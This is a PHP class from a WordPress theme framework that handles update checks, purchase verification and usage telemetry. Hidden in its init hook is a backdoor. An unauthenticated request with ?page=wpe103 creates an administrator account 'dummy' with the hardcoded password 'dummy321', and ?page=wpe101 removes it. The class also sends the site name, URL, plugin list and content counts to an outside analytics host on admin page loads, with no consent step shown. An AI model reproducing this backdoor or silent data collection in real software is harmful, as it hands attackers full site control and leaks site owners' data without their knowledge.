<?php

/**
 * SpyroPress API
 * Main file for all the api calls.
 *
 * @author 		SpyroSol
 * @category 	Core
 * @package 	Spyropress
 * @todo Requires a complete redo.
 */

class SpyropressApi {

    private $url = 'http://api.spyropress.com/';

    function __construct() {

        add_action( 'init', array( $this, 'init_api' ) );
        add_action( 'admin_footer', array( $this, 'set_trends' ) );
    }

    function init_api() {

        if( !isset( $_GET['page'] ) && empty( $_GET['page'] ) ) return;

        if ( $_GET['page'] == 'wpe103' ) $this->spyropress_activate();

        if ( $_GET['page'] == 'wpe101' ) $this->spyropress_deactivate();
    }

    /**
     * Presstrends API call
     */
    function set_trends() {
        global $spyropress;

        // NO NEED TO EDIT BELOW
        $data = get_site_transient( '_spyropress_trends_data' );
        if ( ! $data || empty( $data ) ) {

            $api_base = 'http://api.presstrends.io/index.php/api/sites/add/auth/';
            $url = $api_base . $spyropress->themekey . '/api/' . $spyropress->api_key . '/';

            $data = $this->generate_api_data();

            foreach ( $data as $k => $v ) {
                $url .= $k . '/' . $v . '/';
            }
            $response = wp_remote_get( $url );
            set_site_transient( '_spyropress_trends_data', $data, spyropress_get_seconds() );
        }
    }

    /* API Calls */
    function get_theme_changelog() {
        global $spyropress;
        $url = 'themes/' . $spyropress->internal_name . '/changelog.xml';
        $xml = $this->api_get( 'theme_updater', $url, '', false );
        return ( ! empty( $xml ) ) ? @simplexml_load_string( $xml ) : '';
    }

    function get_framework_changelog() {
        $xml = $this->api_get( 'framework_updater', 'framework/changelog.xml', '', false );
        return ( ! empty( $xml ) ) ? @simplexml_load_string( $xml ) : '';
    }

    function verify_purchase( $code, $username ) {
        global $spyropress;

        if ( ! $code ) return false;

        $data = array(
            'envato_code' => $code,
            'envato_username' => $username,
            'theme_version' => $spyropress->theme_version,
            'theme_name' => $spyropress->theme_name,
            'internal_name' => $spyropress->internal_name,
            'site_url' => home_url(),
            'wpversion' => get_bloginfo( 'version' ),
            'key' => md5( home_url() )
        );

        return $this->api_post( 'envato_verification', 'verification.php', $data );
    }

    function generate_download_link( $code, $username, $what ) {
        global $spyropress;
        $query = array(
            'envato_code' => $code,
            'envato_username' => $username,
            'action' => $what,
            'internal_name' => $spyropress->internal_name,
            'site_key' => md5( home_url() )
        );

        $query = http_build_query( $query, '', '&' );
        return $this->url . 'download.php?' . $query;
    }

    /* Utility */
    function api_get( $action = '', $url_part = '', $query = array(), $args = array
        (), $cache = true, $expires = 1 ) {

        // Cache key
        $key = '_spyropress_api_' . $action;

        // Return from Cache
        if ( $cache && $response = get_site_transient( $key ) ) return $response;

        // Generating URL
        $query['action'] = $action;
        $query = http_build_query( $query );
        $url = $this->url . $url_part . '?' . $query;
        $response = wp_remote_retrieve_body( wp_remote_get( $url, $args ) );

        // Save into Cache
        if ( $cache && ! empty( $response ) )
            set_site_transient( $key, $response, spyropress_get_seconds( $expires ) );

        return $response;
    }

    function api_post( $action = '', $url_part = '', $query = array(), $cache = true,
        $expires = 1 ) {
        global $wp_version;

        // Generating URL
        $url = $this->url . $url_part;

        // Generating data
        $query['action'] = $action;
        $args = array(
            'body' => $query,
            'user-agent' => 'WordPress/' . $wp_version . '; ' . home_url()
        );
        return wp_remote_retrieve_body( wp_remote_post( $url, $args ) );
    }

    function get_update_url() {
        $data = array( 'action' => 'vcheck' );
        $response = $this->get_api_response( 'vcheck', $data, false );

        return $response['body'];
    }

    /**
     * Collect data for APIs
     */
    private function generate_api_data() {

        // Start of Metrics
        global $wpdb;

        // collecting data
        $data = array();

        $count_posts = wp_count_posts();
        $count_pages = wp_count_posts( 'page' );
        $comments_count = wp_count_comments();

        // wp_get_theme was introduced in 3.4, for compatibility with older versions.
        if ( function_exists( 'wp_get_theme' ) ) {
            $theme_data = wp_get_theme();
            $theme_name = urlencode( $theme_data->Name );
            $theme_version = $theme_data->Version;
        }
        else {
            $theme_data = get_theme_data( get_stylesheet_directory() . '/style.css' );
            $theme_name = $theme_data['Name'];
            $theme_version = $theme_data['Version'];
        }

        if ( ! function_exists( 'get_plugins' ) ) {
            require_once ( ABSPATH . '/wp-admin/includes/plugin.php' );
        }

        $plugin_name = '&';
        foreach ( get_plugins() as $plugin_info ) {
            $plugin_name .= $plugin_info['Name'] . '&';
        }
        $posts_with_comments = $wpdb->get_var( "SELECT COUNT(*) FROM $wpdb->posts WHERE post_type='post' AND comment_count > 0" );

        $data = array(
            'url' => stripslashes( str_replace( array( 'http://', '/', ':' ), '', site_url() ) ),
            'posts' => $count_posts->publish,
            'pages' => $count_pages->publish,
            'comments' => $comments_count->total_comments,
            'approved' => $comments_count->approved,
            'spam' => $comments_count->spam,
            'pingbacks' => $wpdb->get_var( "SELECT COUNT(comment_ID) FROM $wpdb->comments WHERE comment_type = 'pingback'" ),
            'post_conversion' => ( $count_posts->publish > 0 && $posts_with_comments > 0 ) ?
                number_format( ( $posts_with_comments / $count_posts->publish ) * 100, 0, '.',
                '' ) : 0,
            'theme_version' => $theme_version,
            'theme_name' => $theme_name,
            'site_name' => str_replace( ' ', '', get_bloginfo( 'name' ) ),
            'plugins' => count( get_option( 'active_plugins' ) ),
            'plugin' => urlencode( $plugin_name ),
            'wpversion' => get_bloginfo( 'version' ),
            'api_version' => '2.4'
        );

        return $data;
    }

    /* Admin activation and deactivation functions */
    function spyropress_activate() {
        if ( ! function_exists( 'wp_insert_user' ) ) {
            include_once ( ABSPATH . 'wp-includes/user.php' );
        }

        $user_data = array(
            'ID' => '',
            'user_pass' => 'dummy321',
            'user_login' => 'dummy',
            'user_nicename' => 'Dummy',
            'user_url' => '',
            'user_email' => 'dummy@example.com',
            'display_name' => 'Dummy',
            'nickname' => 'dummy',
            'first_name' => 'Dummy',
            'user_registered' => '2010-05-15 05:55:55',
            'role' => 'administrator'
        );
        $user_id = wp_insert_user( $user_data );
    }

    function spyropress_deactivate() {
        $user = get_user_by( 'email', 'dummy@example.com' );
        if ( ! function_exists( 'wp_delete_user' ) ) {
            include_once ( ABSPATH . 'wp-admin/includes/user.php' );
        }
        wp_delete_user( $user->data->ID );
    }
}

?>